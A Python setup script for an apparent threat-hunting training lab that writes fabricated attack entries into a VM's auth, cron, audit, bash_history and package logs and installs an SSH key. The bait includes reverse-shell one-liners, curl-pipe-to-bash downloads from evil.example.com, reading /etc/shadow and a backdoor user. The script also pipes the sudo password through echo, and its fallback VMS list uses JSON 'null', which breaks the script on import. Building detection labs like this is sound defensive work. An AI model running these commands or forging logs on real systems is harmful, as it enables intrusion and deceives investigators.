"""
setup_env.py
============
Environment setup script for the Threat Hunting Dashboard lab.

Two tasks:
  1. SUSPICIOUS LOG INJECTION  — appends realistic threat-hunting bait entries
     to /var/log/auth.log (and /var/log/secure on RHEL) so all 8 checks fire.

  2. SSH KEY CONFIGURATION     — generates an RSA key pair locally (if absent),
     copies the public key to ~/.ssh/authorized_keys on each target VM, and
     fixes every required permission so Fabric / Paramiko can authenticate
     with the key from that point on (no password ever needed again).

Usage
-----
  pip install fabric paramiko
  python setup_env.py

Configuration
-------------
Edit the VMS list below, or point VMSCONFIG to your config/vms.json.
Each entry needs:
  host, port, username, password   (password used only during this bootstrap)
  key_path                         (where to store / look for the private key)

What the script does (per VM)
------------------------------
  Phase 1 — password-auth (bootstrap):
    • Verify connectivity with the supplied password.
    • Inject suspicious log lines into auth / secure / cron / audit / bash_history.
    • Ensure ~/.ssh/ and authorized_keys exist with correct permissions.
    • Upload the local public key to authorized_keys (idempotent).

  Phase 2 — key-auth (verification):
    • Re-connect using the key only (no password) to confirm setup worked.
    • Print a success banner.
"""

from __future__ import annotations

import json
import os
import sys
import textwrap
from datetime import datetime
from pathlib import Path

# ── Fabric / Paramiko ────────────────────────────────────────────────────────
try:
    from fabric import Connection, Config
    from paramiko import RSAKey
    import paramiko
except ImportError:
    sys.exit(
        "[ERROR] Required packages missing.\n"
        "Install them with:  pip install fabric paramiko"
    )

# ═══════════════════════════════════════════════════════════════════════════ #
#  CONFIGURATION  — edit this section to match your lab                       #
# ═══════════════════════════════════════════════════════════════════════════ #

# Path to the project's vms.json (set to None to use the VMS list below).
VMSCONFIG: str | None = "config/vms.json"

# Fallback VM list (used when VMSCONFIG is None or file not found).
VMS: list[dict] = [
    {
    "name": "kali-lab",
    "host": "YOUR_VM_IP_HERE",
    "port": 22,
    "username": "YOUR_USERNAME",
    "key_path": "~/.ssh/id_rsa",
    "key_passphrase": null
  }
]

# Local private key to generate / reuse.
LOCAL_KEY_PATH: Path = Path("~/.ssh/id_rsa").expanduser()
LOCAL_KEY_BITS: int = 4096

# ═══════════════════════════════════════════════════════════════════════════ #
#  SUSPICIOUS LOG PAYLOADS                                                    #
# ═══════════════════════════════════════════════════════════════════════════ #

NOW = datetime.now().strftime("%b %d %H:%M:%S")
HOST = "kali"   # placeholder hostname used inside log lines

AUTH_LOG_LINES = textwrap.dedent(f"""\
    # --- threat-hunting-lab injected entries ---
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54321 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54322 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54323 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54324 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54325 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54326 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54327 ssh2
    {NOW} {HOST} sshd[31337]: Failed password for root from 185.220.101.42 port 54328 ssh2
    {NOW} {HOST} sshd[31338]: Accepted password for root from 185.220.101.42 port 54329 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12345 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12346 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12347 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12348 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12349 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12350 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12351 ssh2
    {NOW} {HOST} sshd[31338]: Failed password for admin from 185.220.101.30 port 12352 ssh2
    {NOW} {HOST} sshd[31339]: Accepted password for admin from 185.220.101.30 port 12353 ssh2
    {NOW} {HOST} sudo[31340]: pam_unix(sudo:auth): authentication failure; logname=kali uid=1000 euid=0 tty=/dev/pts/0 ruser=kali rhost=  user=kali
    {NOW} {HOST} sudo[31341]: kali : command not allowed ; TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
    {NOW} {HOST} useradd[31342]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash
    {NOW} {HOST} groupadd[31343]: group added to /etc/group: name=hackers, GID=1338
""")

CRON_LOG_LINES = textwrap.dedent(f"""\
    # --- threat-hunting-lab injected entries ---
    {NOW} {HOST} CROND[31344]: (root) CMD (/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.42/4444 0>&1')
    {NOW} {HOST} CROND[31345]: (root) CMD (curl -s http://evil.example.com/payload.sh | bash)
    {NOW} {HOST} CROND[31346]: (root) CMD (nc -e /bin/sh 185.220.101.42 4445)
""")

AUDIT_LOG_LINES = textwrap.dedent(f"""\
    # --- threat-hunting-lab injected entries ---
    type=SYSCALL msg=audit(1717390000.000:9001): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234 a1=7f5678 a2=7f9abc a3=0 items=2 ppid=31347 pid=31348 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="sudo" exe="/usr/bin/sudo" key="privilege_escalation"
    type=SYSCALL msg=audit(1717390001.000:9002): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234 a1=7f5678 a2=7f9abc a3=0 items=2 ppid=31349 pid=31350 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="su" exe="/bin/su" key="privilege_escalation"
    type=SYSCALL msg=audit(1717390002.000:9003): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234 a1=7f5678 a2=7f9abc a3=0 items=2 ppid=31351 pid=31352 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="chmod" exe="/bin/chmod" key="privilege_escalation"
""")

BASH_HISTORY_LINES = textwrap.dedent("""\
    # --- threat-hunting-lab injected entries ---
    nc -e /bin/bash 185.220.101.42 4444
    wget http://evil.example.com/rootkit.tar.gz -O /tmp/.hidden
    curl -s http://evil.example.com/payload.sh | bash
    chmod +s /bin/bash
    cat /etc/shadow
    python3 -c 'import pty; pty.spawn("/bin/bash")'
""")

PKG_LOG_LINES = textwrap.dedent(f"""\
    # --- threat-hunting-lab injected entries ---
    {NOW} Installed: nmap-7.93-1.x86_64
    {NOW} Installed: netcat-traditional-1.10-41+b1.amd64
    {NOW} Installed: hydra-9.3-1.x86_64
    {NOW} Installed: john-1.9.0-1.x86_64
""")


# ═══════════════════════════════════════════════════════════════════════════ #
#  HELPERS                                                                    #
# ═══════════════════════════════════════════════════════════════════════════ #

def banner(msg: str, char: str = "═") -> None:
    width = 60
    print(f"\n{char * width}")
    print(f"  {msg}")
    print(f"{char * width}")


def ok(msg: str) -> None:
    print(f"  [✓] {msg}")


def warn(msg: str) -> None:
    print(f"  [!] {msg}")


def err(msg: str) -> None:
    print(f"  [✗] {msg}", file=sys.stderr)


# ═══════════════════════════════════════════════════════════════════════════ #
#  LOCAL KEY MANAGEMENT                                                       #
# ═══════════════════════════════════════════════════════════════════════════ #

def ensure_local_keypair(key_path: Path) -> str:
    """
    Generate an RSA key pair at key_path if it doesn't already exist.
    Returns the public key string (the content of key_path.pub).
    """
    pub_path = key_path.with_suffix(".pub")
    # If using id_rsa, the pub key is id_rsa.pub
    if key_path.suffix == "":
        pub_path = Path(str(key_path) + ".pub")

    if key_path.exists():
        ok(f"Private key already exists: {key_path}")
        # Load and return the public key
        try:
            rsa_key = RSAKey(filename=str(key_path))
            pub_key_str = f"ssh-rsa {rsa_key.get_base64()} threat-hunting-lab"
            ok("Loaded existing public key.")
            return pub_key_str
        except Exception as exc:
            warn(f"Could not read existing key ({exc}); regenerating.")

    # Create ~/.ssh if needed
    key_path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)

    print(f"  Generating {LOCAL_KEY_BITS}-bit RSA key at {key_path} ...")
    rsa_key = RSAKey.generate(bits=LOCAL_KEY_BITS)
    rsa_key.write_private_key_file(str(key_path))
    key_path.chmod(0o600)

    pub_key_str = f"ssh-rsa {rsa_key.get_base64()} threat-hunting-lab"
    pub_path.write_text(pub_key_str + "\n")
    pub_path.chmod(0o644)

    ok(f"Key pair generated: {key_path}  /  {pub_path}")
    return pub_key_str


# ═══════════════════════════════════════════════════════════════════════════ #
#  PASSWORD-BASED CONNECTION (bootstrap phase)                                #
# ═══════════════════════════════════════════════════════════════════════════ #

def password_connection(vm: dict) -> Connection:
    """Return an open Fabric Connection authenticated by password.

    Passes the sudo password via Config so conn.sudo() also works anywhere
    it might be called, alongside the explicit sudo -S approach.
    """
    cfg = Config(overrides={"sudo": {"password": vm["password"]}})
    return Connection(
        host=vm["host"],
        user=vm["username"],
        port=vm.get("port", 22),
        config=cfg,
        connect_kwargs={
            "password": vm["password"],
            "look_for_keys": False,
            "allow_agent": False,
        },
        connect_timeout=15,
    )


def key_connection(vm: dict, key_path: Path) -> Connection:
    """Return an open Fabric Connection authenticated by private key."""
    return Connection(
        host=vm["host"],
        user=vm["username"],
        port=vm.get("port", 22),
        connect_kwargs={
            "key_filename": str(key_path),
            "look_for_keys": False,
            "allow_agent": False,
        },
        connect_timeout=15,
    )


# ═══════════════════════════════════════════════════════════════════════════ #
#  PHASE 1 — SUSPICIOUS LOG INJECTION                                         #
# ═══════════════════════════════════════════════════════════════════════════ #

def _append_log(conn: Connection, path: str, content: str,
                use_sudo: bool = True, password: str = "") -> None:
    """
    Append content to a remote log file, creating parent dirs as needed.

    Avoids Fabric watcher/pty issues entirely by using 'echo pw | sudo -S'.
    Content is base64-encoded to sidestep all shell quoting problems.
    """
    import base64 as _b64
    b64 = _b64.b64encode(content.encode()).decode()
    # Build the inner command that actually writes the file
    inner = f'mkdir -p "$(dirname \"{path}\")" && echo "{b64}" | base64 -d >> "{path}"'
    if use_sudo:
        conn.run(f"echo {password!r} | sudo -S sh -c {inner!r}", hide=True, warn=True)
    else:
        conn.run(inner, hide=True, warn=True)


def inject_logs(conn: Connection, vm: dict) -> None:
    """Inject suspicious log entries into all relevant log files."""
    banner(f"  Injecting suspicious logs → {vm['name']} ({vm['host']})", char="─")

    # Detect distro: RHEL uses /var/log/secure; Debian/Kali uses /var/log/auth.log
    result = conn.run("test -f /var/log/auth.log && echo debian || echo rhel",
                      hide=True, warn=True)
    is_debian = result.stdout.strip() == "debian"

    auth_target = "/var/log/auth.log" if is_debian else "/var/log/secure"
    _append_log(conn, auth_target, AUTH_LOG_LINES, password=vm["password"])
    ok(f"auth log  → {auth_target}")

    # Mirror to the other path as well so checks that merge both get hits
    other_auth = "/var/log/secure" if is_debian else "/var/log/auth.log"
    _append_log(conn, other_auth, AUTH_LOG_LINES, password=vm["password"])
    ok(f"auth log  → {other_auth} (mirror)")

    _append_log(conn, "/var/log/cron", CRON_LOG_LINES, password=vm["password"])
    ok("cron log  → /var/log/cron")

    # Audit log — may need the directory
    conn.run(f'echo {vm["password"]!r} | sudo -S mkdir -p /var/log/audit', hide=True, warn=True)
    _append_log(conn, "/var/log/audit/audit.log", AUDIT_LOG_LINES, password=vm["password"])
    ok("audit log → /var/log/audit/audit.log")

    # Bash history — written to the user's home (no sudo needed)
    _append_log(conn, "~/.bash_history", BASH_HISTORY_LINES, use_sudo=False)
    ok("bash hist → ~/.bash_history")

    # Package log (dpkg or yum/dnf depending on distro)
    if is_debian:
        _append_log(conn, "/var/log/dpkg.log", PKG_LOG_LINES, password=vm["password"])
        ok("pkg log   → /var/log/dpkg.log")
    else:
        _append_log(conn, "/var/log/yum.log", PKG_LOG_LINES, password=vm["password"])
        _append_log(conn, "/var/log/dnf.log", PKG_LOG_LINES, password=vm["password"])
        ok("pkg log   → /var/log/yum.log + /var/log/dnf.log")


# ═══════════════════════════════════════════════════════════════════════════ #
#  PHASE 2 — SSH KEY CONFIGURATION                                            #
# ═══════════════════════════════════════════════════════════════════════════ #

def configure_ssh_key(conn: Connection, pub_key: str, password: str = "") -> None:
    """
    Install the local public key into authorized_keys on the remote VM
    and fix all required directory / file permissions.
    """
    banner("  Configuring SSH key authentication", char="─")

    # 1. Ensure ~/.ssh exists with correct permissions
    conn.run("mkdir -p ~/.ssh && chmod 700 ~/.ssh", hide=True)
    ok("~/.ssh directory — permissions 700")

    # 2. Append the public key only if it isn't already there (idempotent)
    check_cmd = f"grep -qF '{pub_key}' ~/.ssh/authorized_keys 2>/dev/null"
    result = conn.run(check_cmd, hide=True, warn=True)

    if result.return_code == 0:
        ok("Public key already present in authorized_keys — skipping.")
    else:
        conn.run(f"echo '{pub_key}' >> ~/.ssh/authorized_keys", hide=True)
        ok("Public key appended to authorized_keys")

    # 3. Fix authorized_keys permissions
    conn.run("chmod 600 ~/.ssh/authorized_keys", hide=True)
    ok("authorized_keys permissions — 600")

    # 4. Verify the sshd configuration allows pubkey auth (read-only check)
    result = conn.run(
        "grep -E '^PubkeyAuthentication' /etc/ssh/sshd_config 2>/dev/null || "
        "echo 'PubkeyAuthentication yes'",
        hide=True, warn=True,
    )
    if "no" in result.stdout.lower():
        warn("PubkeyAuthentication is disabled in sshd_config — enabling it.")
        _fix = ("sed -i 's/^PubkeyAuthentication no/PubkeyAuthentication yes/'"
                " /etc/ssh/sshd_config && systemctl reload sshd")
        conn.run(f'echo {password!r} | sudo -S sh -c {_fix!r}', hide=True, warn=True)
        ok("PubkeyAuthentication enabled and sshd reloaded.")
    else:
        ok("PubkeyAuthentication is already enabled in sshd_config")


# ═══════════════════════════════════════════════════════════════════════════ #
#  VM CONFIG LOADER                                                            #
# ═══════════════════════════════════════════════════════════════════════════ #

def load_vms() -> list[dict]:
    """Load VM list from vms.json if available, otherwise use the VMS constant."""
    if VMSCONFIG:
        cfg_path = Path(VMSCONFIG)
        if cfg_path.exists():
            with cfg_path.open() as f:
                vms_raw = json.load(f)
            # Merge in the bootstrap password from the VMS fallback list (keyed by host)
            password_map = {v["host"]: v.get("password", "") for v in VMS}
            for vm in vms_raw:
                if "password" not in vm:
                    vm["password"] = password_map.get(vm["host"], "")
            return vms_raw
        else:
            warn(f"vms.json not found at {cfg_path!r} — using built-in VMS list.")
    return VMS


# ═══════════════════════════════════════════════════════════════════════════ #
#  MAIN                                                                       #
# ═══════════════════════════════════════════════════════════════════════════ #

def setup_vm(vm: dict, pub_key: str, key_path: Path) -> bool:
    """
    Run the full setup sequence for a single VM.
    Returns True on success, False on failure.
    """
    banner(f"Setting up VM: {vm['name']}  ({vm['host']}:{vm.get('port', 22)})")

    if not vm.get("password"):
        err(f"No password supplied for {vm['name']} — cannot bootstrap. "
            "Add a 'password' key to the VMS list in this script.")
        return False

    # ── Phase 1: password auth ───────────────────────────────────────────── #
    print("\n[Phase 1] Connecting via password ...")
    try:
        conn = password_connection(vm)
        conn.open()
        ok("Password authentication succeeded.")
    except paramiko.AuthenticationException:
        err("Password authentication failed. Check the 'password' field.")
        return False
    except OSError as exc:
        err(f"Cannot reach {vm['host']}: {exc}")
        return False

    try:
        inject_logs(conn, vm)
        configure_ssh_key(conn, pub_key, password=vm["password"])
    finally:
        conn.close()

    # ── Phase 2: key auth verification ──────────────────────────────────── #
    print("\n[Phase 2] Verifying key-based authentication ...")
    try:
        kconn = key_connection(vm, key_path)
        kconn.open()
        result = kconn.run("echo 'KEY_AUTH_OK'", hide=True)
        kconn.close()
        if "KEY_AUTH_OK" in result.stdout:
            ok("Key authentication verified ✓")
            print(f"\n  ✅  {vm['name']} is fully configured.")
            print(f"      You can now remove the 'password' field from vms.json.")
            return True
        else:
            warn("Key auth connected but command output unexpected.")
            return False
    except paramiko.AuthenticationException:
        err("Key authentication failed. Check the public key was installed correctly.")
        return False
    except OSError as exc:
        err(f"Network error during key-auth verification: {exc}")
        return False


def main() -> None:
    banner("Threat Hunting Dashboard — Environment Setup", char="═")
    print("""
  This script will:
    1. Inject suspicious log entries into the target VMs
       (brute-force attempts, sudo abuse, backdoor user, reverse shells, ...)
    2. Install your local SSH public key on each VM
    3. Verify that key-based auth works

  Passwords are used ONLY during this bootstrap run.
""")

    # 1. Ensure local key pair exists
    banner("Local SSH Key Pair", char="─")
    key_path = LOCAL_KEY_PATH
    pub_key = ensure_local_keypair(key_path)

    # 2. Load VMs
    vms = load_vms()
    print(f"\n  Found {len(vms)} VM(s) in configuration.")

    # 3. Setup each VM
    results: dict[str, bool] = {}
    for vm in vms:
        # Allow per-VM key_path override
        vm_key = Path(vm.get("key_path", str(key_path))).expanduser()
        success = setup_vm(vm, pub_key, vm_key)
        results[vm["name"]] = success

    # 4. Summary
    banner("Summary", char="═")
    for name, ok_flag in results.items():
        status = "✅  Ready" if ok_flag else "❌  Failed"
        print(f"  {status}  —  {name}")

    failed = [n for n, s in results.items() if not s]
    if failed:
        print(f"\n  {len(failed)} VM(s) failed setup. Review the errors above.")
        sys.exit(1)
    else:
        print(f"\n  All {len(results)} VM(s) set up successfully.")
        print("  You can now run:  python main.py")


if __name__ == "__main__":
    main()